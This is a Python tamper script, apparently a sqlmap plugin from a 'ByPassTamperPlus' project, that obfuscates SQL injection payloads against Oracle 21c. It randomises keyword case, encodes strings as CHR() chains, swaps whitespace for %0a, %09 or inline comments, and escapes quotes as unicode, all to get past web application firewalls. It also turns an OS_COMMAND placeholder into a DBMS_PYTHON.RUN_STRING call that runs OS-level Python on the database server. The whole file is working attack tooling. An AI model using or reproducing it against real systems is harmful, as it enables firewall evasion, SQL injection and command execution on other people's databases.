#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle21c_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "DBMS_PYTHON", "RUN_STRING", "JSON", "DUAL"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", lambda m: "||".join("CHR(%d)" % ord(c) for c in m.group(1)), payload)

    payload = re.sub(r"\s+", lambda m: random.choice(["%0a", "%09", "/**/"]), payload)

    payload = payload.replace("'", "\\u0027").replace('"', "\\u0022")

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "FROM DUAL" in payload.upper():
        match = re.search(r"SELECT\s+(.+?)\s+FROM\s+DUAL", payload, re.IGNORECASE)
        if match:
            inner = match.group(1)
            payload = payload.replace(match.group(0), "SELECT JSON_SERIALIZE(JSON('{\"r\":\"'||(%s)||\"}')) FROM DUAL" % inner)

    if "OS_COMMAND" in payload:
        payload = payload.replace("OS_COMMAND", "DBMS_PYTHON.RUN_STRING('import os; print(os.getlogin())')")

    if "ALL_TAB_COLUMNS" in payload.upper():
        payload = payload.replace("ALL_TAB_COLUMNS", "(SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME NOT LIKE 'SYS%')")

    return general_obfuscate(payload)
